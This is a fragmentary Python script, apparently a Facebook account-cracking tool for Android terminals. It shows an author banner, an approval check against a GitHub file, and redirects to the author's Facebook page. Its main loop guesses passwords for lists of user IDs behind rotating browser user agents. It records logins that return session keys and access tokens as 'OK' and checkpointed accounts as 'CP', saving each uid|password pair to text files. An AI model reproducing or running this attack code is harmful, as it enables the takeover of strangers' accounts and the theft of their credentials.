...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Mr DIPTO\x1b[0m\x1b[1;97m]
...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : Mr-DIPTO \x1b[0m\x1b[1;97m]

\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : www.gitclone//github.com/D1PTO-Official \x1b[0m\x1b[1;97m]

\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : www.facebook./ITZ.DIPTO.TFG.KING.OKAY \x1b[0m\x1b[1;97m]
...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/D1PTO-Official/aproval.txt/blob/main/aproval.txt"])

	#yahan apni facebook id link dalna

	exit(" [=>] FACEBOOK :  https://www.facebook.com/ITZ.DIPTO.TFG.KING.OKAY")
...
class Main:
	...
	def __init__(self):
		...
		try:
			...
			plr = requests.get('https://github.com/D1PTO-Official/aproval.txt/blob/main/aproval.txt').text
...
───────────────────────────────────────────────────────× 
    ...
    """)
		...
		subprocess.check_output(["am", "start", "https://www.facebook.com/ITZ.DIPTO.TFG.KING.OKAY"])
...
'Mozilla/5.0 (Linux; Android 5.1; PICOphone_M4U_M2_M Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36',
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r  \033[0;97m   [=DIPTO=OK=>] %s | %s\033[0;97m         "%(uid, pw))

				self.ok.append("%s|%s"%(uid, pw))

				open("ok.txt","a").write("   [=DIPTO=OK=>]  %s|%s\n"%(uid, pw))

				break

			elif "www.facebook.com" in response.json()["error_msg"]:

				print("\r  \033[0;92m   [=DIPTO=CP=>] %s | %s\033[0;97m         "%(uid, pw))

				self.cp.append("%s|%s"%(uid, pw))

				open("cp.txt","a").write("   [=DIPTO=CP=>]  %s|%s\n"%(uid, pw))
 ...
 #DIPTO copy krke apna name dal dyna
